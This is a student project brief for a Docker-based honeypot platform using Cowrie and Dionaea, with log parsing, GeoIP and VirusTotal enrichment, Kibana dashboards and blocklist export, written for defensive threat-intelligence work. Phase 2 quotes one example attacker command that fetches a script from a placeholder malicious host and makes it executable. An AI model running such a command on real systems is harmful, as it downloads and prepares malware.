# 🎯 030 - Honeypot Deployment & Attack Analysis Platform

> **Category**: [[Network Penetration Testing]] | **Difficulty**: ⭐⭐ | **Duration**: 5 weeks

---

## 📋 Problem Statement

> [!CAUTION] Real-World Impact
> Organizations face continuous, automated attacks from global botnets, zero-day scanners, and malicious threat actors. Defensive teams often lack early-stage threat intelligence detailing the exact credentials, exploitation commands, zero-day payloads, and IP origins used by active adversaries before enterprise production systems are targeted.

Honeypots are decoy computer systems deliberately exposed to the internet to lure, detect, and analyze unauthorized access attempts. By operating low-interaction and high-interaction honeypot services that emulate common enterprise protocols (SSH, Telnet, HTTP, SMB, FTP), security teams can capture real-time threat intelligence without risking production assets.

This project covers the development of an automated Honeypot Deployment & Attack Analysis Platform (Honeynet-Intel). Built using Docker containerization, the platform deploys a distributed honeynet featuring Cowrie (SSH/Telnet decoy) and Dionaea (malware capture decoy). Captured attack logs are processed through a centralized Python ingestion engine that extracts attacker IP addresses, geolocation metadata, brute-forced credentials, executed shell commands, and dropped malware binaries—visualizing real-time attack metrics on an interactive ELK Stack (Elasticsearch, Logstash, Kibana) threat intelligence dashboard.

### 🌍 Real-World Incidents
- **Mirai Botnet SSH Brute-Force Campaigns (2016-Present)**: Global IoT botnets continuously scan IPv4 address space for default SSH/Telnet credentials, infecting unpatched routers and IP cameras within seconds of exposure.
- **Log4Shell Zero-Day Discovery via Honeypots (2021)**: Security researchers identified internet-wide exploitation attempts of the Apache Log4j vulnerability within hours of disclosure through global HTTP honeypots.
- **Automated Ransomware Pre-Cursor Scanning (2023)**: Threat intelligence honeypots captured automated brute-force scripts testing default passwords on exposed RDP and SMB services prior to manual enterprise ransomware deployment.

---

## 🔬 Research Paper References

| # | Paper Title | Authors | Year | Source | Key Contribution |
|---|-------------|---------|------|--------|-----------------|
| 1 | Honeypots for Cybersecurity Threat Intelligence | Bringer et al. | 2017 | IEEE Security & Privacy | Formulated frameworks for collecting, scoring, and operationalizing honeypot threat intelligence logs. |
| 2 | Cowrie: SSH/Telnet Interaction Honeypot | Oosterhof, M. | 2019 | Open Source Report | Documented interaction emulation techniques for capturing attacker shell commands and session tty recordings. |
| 3 | Automated Malware Capture and Analysis via Dionaea | Realini et al. | 2015 | ACM Cyber Intelligence | Evaluated low-interaction SMB/FTP honeypots for automatic malware payload trapping. |

---

## 🏗️ System Architecture
Link: [[Drawing 2026-07-30 22.31.19.excalidraw#Project 030: 030 - Honeypot Deployment & Attack Analysis Platform|Excalidraw Architecture Diagram]]

```mermaid
graph TD
    subgraph Internet_Threats ["1. Internet Attackers & Botnets"]
        Attacker1[Global Automated Botnet] -. Automated SSH Brute Force .-> Gateway[Edge Gateway Router / Firewall]
        Attacker2[Malware Delivery Script] -. SMB Exploit Attempt .-> Gateway
    end

    subgraph Honeynet_Decoys ["2. Containerized Honeypot Layer (Docker)"]
        Gateway -- Port 22/23 Redirect --> Decoy1[Cowrie SSH/Telnet Emulated Shell]
        Gateway -- Port 445/21 Redirect --> Decoy2[Dionaea SMB/FTP Malware Trap]
    end

    subgraph Analytics_Pipeline ["3. Threat Intelligence Processing Engine"]
        Decoy1 -- Raw JSON Logs & TTY Recordings --> Parser[Python Ingestion Engine]
        Decoy2 -- Captured Binary Payloads --> Parser
        
        Parser --> GeoIP[MaxMind GeoIP & ASN Extractor]
        Parser --> VirusTotal[VirusTotal Malware Hash Scanner]
        Parser --> CredentialMiner[Brute-Force Credential Frequency Miner]
    end

    subgraph Visualization_SIEM ["4. SIEM & Threat Intel Dashboard"]
        GeoIP --> Elastic[Elasticsearch Database Engine]
        VirusTotal --> Elastic
        CredentialMiner --> Elastic
        Elastic --> Kibana[Interactive Kibana Threat Map & Dashboard]
        Elastic --> SIEMAlert[Automated IP Blocklist Exporter]
    end

    style Internet_Threats fill:#1e1e2e,stroke:#f38ba8,stroke-width:2px;
    style Honeynet_Decoys fill:#181825,stroke:#89b4fa,stroke-width:2px;
    style Analytics_Pipeline fill:#11111b,stroke:#fab387,stroke-width:2px;
    style Visualization_SIEM fill:#313244,stroke:#a6e3a1,stroke-width:2px;
```

---

## 📐 Technical Implementation

### Phase 1: Research & Environment Setup (Week 1)
- Provision a cloud Virtual Private Server (VPS) instance (e.g., DigitalOcean / AWS EC2) exposed to the public internet.
- Install Docker, Docker Compose, Python 3.11, and the Elastic Stack (Elasticsearch & Kibana).
- Configure firewall rules to safely isolate honeypot containers from host operating system interfaces.

### Phase 2: Core Honeypot Deployment (Weeks 2-3)
- **Containerized Honeypot Deployment (`docker-compose.yml`)**:
  - Deploy **Cowrie** container listening on public ports 22 (SSH) and 23 (Telnet).
  - Deploy **Dionaea** container listening on public ports 21 (FTP), 135 (RPC), and 445 (SMB).
- **Log Processing & Intelligence Extractor (`intel_processor.py`)**:
  - Parse real-time Cowrie JSON logs (`cowrie.json`) to extract:
    - Attacker IP address, timestamp, and target port.
    - Username and password combinations tested.
    - Full terminal command execution sequences (e.g., `wget http://malicious-ip/bot.sh; chmod +x bot.sh`).
  - Query **MaxMind GeoIP2** database to append geographic location and Autonomous System Number (ASN) metadata.

### Phase 3: Automated Threat Analysis & Dashboarding (Week 4)
- **Malware Payload Analysis Engine (`malware_scanner.py`)**:
  - Compute SHA-256 hashes of dropped binaries saved in Cowrie/Dionaea download directories.
  - Query VirusTotal API to determine whether captured files match known malware families (e.g., Mirai, Gafgyt, Kinsing).
- **Elasticsearch & Kibana Dashboard Config**:
  - Construct automated log shippers (`Filebeat`) indexing attack logs into Elasticsearch.
  - Build custom Kibana dashboards visualizing:
    1. Real-time global attack origin heatmaps.
    2. Top 20 brute-forced passwords.
    3. Most frequent attacker commands.
    4. Captured malware family distributions.

### Phase 4: Analysis & Documentation (Week 5)
- Collect and analyze attack data over a 7-day live internet exposure window.
- Generate dynamic threat intelligence blocklists (exporting bad IP addresses into firewall `iptables` format).
- Complete final BTech dissertation report and demonstration slides.

---

## 🔧 Tools & Technologies

| Tool | Purpose | Alternative |
|------|---------|-------------|
| Cowrie | Medium-interaction SSH/Telnet honeypot for logging shell commands | SSHD Fake |
| Dionaea | Low-interaction honeypot for capturing malware payloads over SMB/FTP | Conpot |
| Elasticsearch & Kibana | Log aggregation, search indexing, and threat visualization dashboard | Grafana + Loki |
| Docker / Docker Compose | Isolated container orchestration for honeypot services | Vagrant |
| MaxMind GeoIP2 / VirusTotal API | IP geolocation metadata enrichment and malware hash lookup | IPInfo API |

---

## 💡 Key Features
- ✅ **Multi-Protocol Decoy Layer**: Emulates SSH, Telnet, SMB, FTP, and RPC services to capture multi-vector attack traffic.
- ✅ **Full Terminal Command Recording**: Logs every command typed by attackers within emulated Cowrie shell sessions.
- ✅ **Automated Malware Payload Extraction**: Traps dropped malware binaries and automatically queries VirusTotal for threat classification.
- ✅ **GeoIP & ASN Enrichment**: Appends country codes, city names, and ISP ownership data to every attack event.
- ✅ **Interactive Kibana SIEM Dashboard**: Displays live global attack heatmaps, password frequency charts, and automated IP blocklists.

---

## 📊 Expected Results

> [!NOTE] Deliverables
> Complete Dockerized honeynet deployment repository, Python threat processing pipeline, sample dataset of captured internet attack logs, and executive threat intelligence report.

### Performance Metrics
- **Log Processing Speed**: < 50 milliseconds from raw honeypot event to Elasticsearch index.
- **Enrichment Throughput**: > 500 IP geolocation queries per second using local GeoIP databases.
- **Decoy Stealthiness**: 100% of automated botnet scanners process Cowrie as a legitimate Linux SSH server.

### Output Artifacts
1. Honeynet Deployment Architecture (`docker-compose.yml`).
2. Python Threat Processing Pipeline (`honeynet_intel_miner.py`).
3. Executive Cyber Threat Intelligence Report (`live_attack_analysis.pdf`).

---

## 🎓 Learning Outcomes
1. 📚 **Honeypot Technology & Decoy Design**: Understanding low vs high interaction honeypots, interaction emulation, and decoy deployment strategies.
2. 📚 **Cyber Threat Intelligence (CTI)**: Practical experience collecting, normalizing, enriching, and operationalizing raw threat data.
3. 📚 **SIEM & Log Analytics**: Mastery of the Elastic Stack (Elasticsearch, Logstash, Kibana) for real-time security data visualization.
4. 📚 **Malware & Botnet Forensics**: Skills analyzing automated botnet propagation scripts, shell payloads, and SHA-256 file hashes.

---

## ⚠️ Ethical Considerations
> [!WARNING] Legal & Ethical Notice
> Operating public-facing honeypots attracts real malicious traffic and malware payloads. Honeypot containers MUST be strictly isolated from internal corporate networks and host environments to prevent attackers from breaking out of the container (container escape) and using your infrastructure to launch secondary attacks.

---

## 🔗 Related Projects
- [[016 - Automated Network Reconnaissance Framework]]
- [[018 - DNS Tunneling Detection Using ML Classifiers]]
- [[021 - Network Traffic Anomaly Detection using Autoencoders]]

---
*📅 Created: 2026-07-30 | 🏷️ Category: Network Penetration Testing | 🔐 Offensive Security Research*
